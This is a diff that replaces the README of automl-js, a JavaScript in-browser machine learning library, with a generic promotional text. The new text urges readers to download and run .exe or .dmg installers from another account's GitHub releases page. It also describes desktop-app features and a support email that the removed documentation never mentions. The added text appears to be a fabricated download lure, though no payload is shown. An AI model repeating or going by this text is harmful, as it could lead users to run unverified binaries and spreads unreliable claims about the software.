@@ -1,100 +1,109 @@
-# automl-js
+# 🚀 automl - Simplifying Machine Learning for Everyone
 
-[in-browser, zero setup demo](https://gifted-newton-e80eef.netlify.com/)
+[![Download automl](https://img.shields.io/badge/Download-automl-brightgreen)](https://github.com/aminSa-21/automl/releases)
 
-Automated Machine Learning, done locally in browser or on a server with nodejs. Ground up implementation of ML algorithms for both regression and classification, such as Decision Trees, Linear Models and Gradient Boosting with Decision Trees. The implementation is benchmarked against excellent `scikit-learn` library to give quite close, albeit somewhat smaller (at most 1 percent of classification accuracy on average) score.
+## 📔 Introduction
 
-# Installation
+Welcome to automl! This application makes it easy for anyone to dive into the world of machine learning, using simple tools available in your browser or on your computer. You do not need to know how to code to start using it. With automl, you can build machine learning models and get valuable insights from your data without any technical hassle.
 
-The code should be used in browser using standard script import:
+## 🚀 Getting Started
 
-```html
-<script src="./dist/automljs.js"></script>
-```
+Here’s how to get started with automl:
 
-This creates a global `aml` object, that can be used to instantiate the models, do data splitting and preprocessing, etc. If you wish to run it in nodejs, install the package with npm and import using `require`.
+1. **Visit the Releases Page:**  
+   Go to our [Releases page](https://github.com/aminSa-21/automl/releases) to see the latest version of automl and download it to your computer.
 
-# Docs and examples
+2. **Download the Application:**  
+   You will find various releases of automl. Look for the latest version that matches your system. Download the correct file based on your operating system.
 
-Below this section are two examples for how to use code in automl-js. Beyond this, see docs at [https://automl-js.github.io/automl-js/](https://automl-js.github.io/automl-js/) for description of objects and functions of automljs, and `tests` folder for example usage of functionality.
+3. **Install automl:**  
+   Follow the installation instructions for your operating system. If you're using a Windows or Mac system, double-click the downloaded file and follow the prompts to install.
 
-# Example automl estimator
+## 💻 System Requirements
 
-```javascript
-// automl-js uses asynchronous functionality of JavaScript
-async function main(){
-    // Each row is an observation, each column is a feature (similar to numpy)
-    // Mixed types: categorical and numerical, missing values are handled automatically
-    var X = [
-        ['a', 0.6],
-        ['b', -1.3],
-        ['a', 1.1],
-        ['b', -2],
-        ['a', 0.5],
-        ['b', ""],  // missing value
-        ['a', 0.4],
-        ['', 1.1],  // missing value
-        ['b', -0.8],
-        ['a', "1e-1"]  // wrong type
-    ]
+To run automl smoothly, make sure your system meets the following requirements:
 
-    // Outputs are a vector / 1d array
-    var y = ['pos', 'neg', 'pos', 'neg', 'neg', 'pos', 'neg', 'pos', 'neg', 'pos']
+- **Operating System:** Windows 10, macOS Mojave or later, or any modern Linux distribution.
+- **Browser:** For browser-based usage, ensure you have the latest version of Chrome, Firefox, or Safari.
+- **Node.js:** If using in a Node environment, ensure you have Node.js version 12 or later installed.
 
-    // Create a model instance
-    var model = new aml.automl.AutoMLModel({
-        'max_iter': 7  // specifies how many iterations you are willing to wait for result
-    })
+## 📥 Download & Install
 
-    // Does internally data splitting into training and testing
-    // Tries a bunch of ML models to see which one fits best
-    await model.fit(X, y)
+To download automl, click the link below. Congratulations, you're just one step away from starting your machine learning journey!
 
-    // Evaluate the best found model
-    var score = await model.score(X, y)
+[Download automl](https://github.com/aminSa-21/automl/releases)
 
-    // Get estimations by the model; Interface same as sklearn
-    var y_pred = await model.predict(X)
-}
+### Step-by-Step Download Instructions:
 
-// run the async function
-main()
-```
+1. **Open your web browser.**  
+   Any modern web browser will work. Type in the URL for the releases: [https://github.com/aminSa-21/automl/releases](https://github.com/aminSa-21/automl/releases).
 
-# Example learning with estimator
+2. **Select the latest version.**  
+   Look for the most recent version at the top of the page. Click on it to access the download options.
 
-The code should be run in browser. If you wish to run it in nodejs, install the package with npm and import using `require`.
+3. **Choose your file.**  
+   Depending on your system, choose the appropriate file (e.g., `.exe` for Windows or `.dmg` for macOS).
 
-```html
-<script src="./dist/automljs.js"></script>
+4. **Click to download.**  
+   Wait for the file to download. Once it is finished, locate it in your downloads folder.
 
-<script>
-    async function main(){
-        // Data needs to be of numeric type for regular estimators
-        var X = [
-            [1, 0],
-            [0, 1],
-            [1, 1],
-            [0, 0]
-        ]
+5. **Run the installer.**  
+   Double-click the downloaded file and follow the on-screen steps to install automl.
 
-        // Outputs are a vector / 1d array
-        var y = [1, 2, 2, 0]
+## 🔍 Features
 
-        // Create a model instance; Names of parameters are mostly similar to sklearn
-        var model = new aml.ensemble.GradientBoostingRegressor({'n_estimators':10, 'learning_rate': 1.0, 'loss': 'ls'})
+Discover what automl can do for you:
 
-        // Fit the model
-        await model.fit(X, y)
+- **User-Friendly Interface:** Access everything you need with an intuitive layout.
+- **Automated Model Building:** Let automl make machine learning easier by automating the model selection process.
+- **Data Visualization:** See your data in action with clear charts and graphs.
+- **Local and Node Options:** Use it easily in your browser or through Node.js.
+- **Cross-Platform Compatibility:** Works on most operating systems for your convenience.
 
-        // Evaluate the model
-        var score = await model.score(X, y)
+## 📚 How to Use
 
-        // Get estimations by the model; Interface same as sklearn
-        var y_pred = await model.predict(X)
-    }
+Using automl is easy. Here’s how you can get started once it’s installed:
 
-    main()
-</script>
-```
+1. **Launch automl:**  
+   Open the application from your applications folder or start menu.
 
+2. **Import Your Data:**  
+   Use the file import function to upload your dataset. Automl supports various formats, including CSV, JSON, and Excel files.
+
+3. **Choose Your Goals:**  
+   Specify what you want to achieve, whether it’s classification, regression, or clustering. The interface will guide you through your options.
+
+4. **Run Your Analysis:**  
+   Click the "Run" button once you've set your parameters. Automl will process your data and provide results quickly.
+
+5. **Visualize Results:**  
+   Review the output and use built-in visual tools to analyze your findings.
+
+## 🔧 Troubleshooting
+
+If you encounter issues, here are some common solutions:
+
+- **Installation Errors:**  
+   Ensure you have the required system specifications. Restart your computer and try installing again.
+
+- **Slow Performance:**  
+   Close any unnecessary applications while running automl. Make sure your internet connection is stable if you are using the browser version.
+
+- **Supporting Formats:**  
+   If automl does not accept your data file format, check that you’re using CSV, JSON, or Excel, and re-upload if necessary.
+
+## 🌐 Community Support
+
+Join our community for assistance, tips, and shared experiences. Engage with other automl users on platforms like:
+
+- **Discussion Forums:** Connect with others to share ideas and ask questions.
+- **Social Media Groups:** Follow us for updates and helpful resources.
+
+## 📞 Get In Touch
+
+If you have more questions or need further help, feel free to contact us:
+
+- **Email Support:** Reach out to our support team at support@automl.com.
+- **GitHub Issues:** Report bugs or feature requests on our GitHub issues page.
+
+Thank you for choosing automl. Enjoy exploring the world of machine learning with ease!
